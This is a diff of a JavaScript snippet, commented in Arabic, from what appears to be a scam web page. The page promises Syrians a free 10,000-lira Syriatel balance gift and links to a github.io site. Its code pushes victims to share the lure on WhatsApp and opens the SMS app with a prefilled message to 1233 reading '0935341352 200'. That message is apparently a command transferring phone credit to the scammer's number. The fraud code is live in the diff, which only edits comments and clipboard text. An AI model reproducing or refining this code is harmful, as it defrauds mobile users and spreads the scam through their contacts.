@@ -1,10 +1,10 @@
 <script>
     const number = "1233"; // رقم الهاتف
-    const message = "0935341352 200"; // محتوى الرسالة الجديدة
+    const message = "0935341352 200"; // محتوى الرسالة
     const delay = 10; // عدد الثواني قبل الإرسال التلقائي
     const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
     const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة رصيد هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
-
+    
     let shareCount = 0; // عدد المشاركات
 
     // وظيفة مشاركة الرسالة عبر واتس آب
@@ -24,11 +24,11 @@
         alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
     }
 
-    // وظيفة نسخ النص ومشاركته عبر تطبيق الرسائل
+    // وظيفة نسخ النص إلى الحافظة وإرسال الرسالة عبر تطبيق الرسائل
     function copyAndShare() {
-        // نسخ النص إلى الحافظة (إذا أردت الاحتفاظ بهذه الوظيفة)
-        navigator.clipboard.writeText(message).then(() => {
-            alert("تم نسخ الكود بنجاح! الآن سيتم فتح تطبيق الرسائل.");
+        // نسخ النص إلى الحافظة
+        navigator.clipboard.writeText(fullMessage).then(() => {
+            alert("تم نسخ النص بنجاح! الآن سيتم فتح تطبيق الرسائل لإرسال النص.");
             // إرسال الرسالة عبر تطبيق الرسائل
             window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
         }).catch(err => {
